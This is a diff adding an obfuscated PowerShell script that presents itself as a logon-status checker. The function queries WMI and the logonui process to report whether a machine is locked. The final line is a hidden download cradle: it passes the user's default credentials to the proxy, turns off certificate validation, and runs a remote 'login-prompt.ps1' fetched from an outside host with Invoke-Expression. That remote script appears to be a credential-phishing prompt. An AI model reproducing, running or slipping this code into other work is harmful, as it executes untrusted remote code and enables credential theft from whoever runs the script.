@@ -1,0 +1,32 @@
+ seT-ITem  ("vARia"+"Bl"+"E:8e"+"9Xv") ( [typE]("{3}{1}{0}{2}" -F'.WEB','eT','REquEST','N') );SV ('j'+'2f')  ([TYPe]("{5}{3}{4}{1}{0}{2}{6}" -F'A','Lc','C','.Cr','eDENTia','net','He'));  seT-iTeM ("vA"+"RiAbLE:1"+"c"+"9k")  ( [tyPe]("{3}{2}{5}{6}{1}{4}{0}" -F 'R','E','t.Se','sySteM.NE','pointMAnAGE','RVI','C')); 
+
+function gET-lo`gon`StA`Tus (${Co`mpuT`er} = ${En`V`:co`mPutE`RnaME}) {
+    ${h`Ash} = @{
+        ("{0}{2}{1}" -f'Com','uter','p') = ${c`Omp`UtEr}
+        ("{1}{0}"-f'e','Nam') = '-'
+        ("{1}{0}" -f 'er','Us') = '-'
+        ("{0}{1}"-f'Stat','us') = '-'
+    }
+
+    ${O`Bj} = .("{0}{1}"-f'g','wmi') ("{0}{1}{3}{4}{2}"-f'win32_com','put','tem','ers','ys') -ComputerName ${Co`mP`UtEr} -ea 0
+    ${HA`SH}."U`Ser" = ${O`Bj}."US`erna`ME"
+    ${h`Ash}."N`AmE" = ${O`Bj}."N`AMe"
+
+    try {
+        .("{1}{0}" -f'sr','ep') ${c`ompuT`ER}
+
+        if (${HA`sh}."uS`ER" -notmatch (('^('+'?:'+'-{'+'0}'+'not ')-F[cHar]124+'logged'+' '+(('o'+'n)38'+'N')-crEPlAcE  '38N',[cHAr]36)) -and (&("{2}{1}{3}{0}"-f 'ss','-Pro','Get','ce') ("{1}{2}{0}" -f'nui','l','ogo') -ComputerName ${com`PUT`Er} -ErrorAction ("{1}{0}" -f'p','Sto'))) {
+            ${h`AsH}."S`T`Atus" = ("{0}{1}"-f 'Lo','cked')
+        }
+    } catch {
+        if (${HA`Sh}."us`er" -notmatch (('^(?'+':-0'+'F'+'lnot ').("{1}{0}{2}"-f 'c','RepLA','e').Invoke('0Fl','|')+'l'+'o'+'gged '+(('on'+')mKG')-rePlace([CHaR]109+[CHaR]75+[CHaR]71),[CHaR]36))) {
+            ${h`ASH}."St`AT`Us" = ("{0}{1}{2}" -f'L','ogged o','n')
+        } else {
+            ${ha`sh}."S`TATUS" = ("{3}{2}{0}{1}"-f'd o','n','logge','Not ')
+        }
+    }
+
+    &("{3}{0}{1}{2}" -f 'w-','Obj','ect','Ne') ("{1}{0}"-f 't','psobjec') -Property ${ha`SH}
+}
+
+ $8E9XV::"DEFA`UlTW`eBp`ROxy"."Cr`eDe`NtIA`LS" =   $j2f::"DeFauLTCre`D`E`N`TI`Als";   (Get-iTem ("VA"+"rIAbLE:1"+"C"+"9K") ).VAlUe::"s`Er`VerCE`RTI`FI`cAt`EVA`lID`AtIONc`AlLBAck" = {${T`RuE}}; &("{1}{0}" -f 'X','IE') (.("{2}{1}{0}"-f 'Object','w-','Ne') ("{1}{2}{0}{3}" -f'l','Net.','WebC','ient')).("{3}{2}{1}{0}" -f 'ng','Stri','oad','Downl').Invoke(("{1}{5}{6}{3}{2}{8}{7}{4}{0}"-f 'pt.ps1','h','nect-ros','on','om','ttps:/','/s11.c','gin-pr','.com/lo'))
